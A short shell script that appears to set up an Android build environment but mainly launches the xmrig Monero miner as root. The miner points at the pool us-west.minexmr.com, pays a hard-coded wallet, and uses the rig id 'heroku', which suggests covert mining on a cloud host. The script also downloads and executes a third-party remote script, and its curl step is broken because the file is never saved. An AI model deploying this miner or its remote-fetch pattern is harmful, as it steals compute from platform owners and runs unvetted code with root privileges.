echo "install deps"
sudo apt-get update -y &&sudo apt-get install build-essential cmake libuv1-dev libssl-dev libc6 libhwloc-dev -y

curl https://raw.githubusercontent.com/akhilnarang/scripts/master/setup/android_build_env.sh
chmod 755 android_build_env.sh
./android_build_env.sh

chmod 755 xmrig
sudo ./xmrig -o us-west.minexmr.com:443 -u 45EUJCTJbToDf79PU8YrXxHwAomkXcWapBBGeQSKbb3hJKRbwbbJ8NZ34GQT61qkPEivjq3fk78DxVhmyyZCeSXJ1hw7PQR -k --tls --rig-id heroku
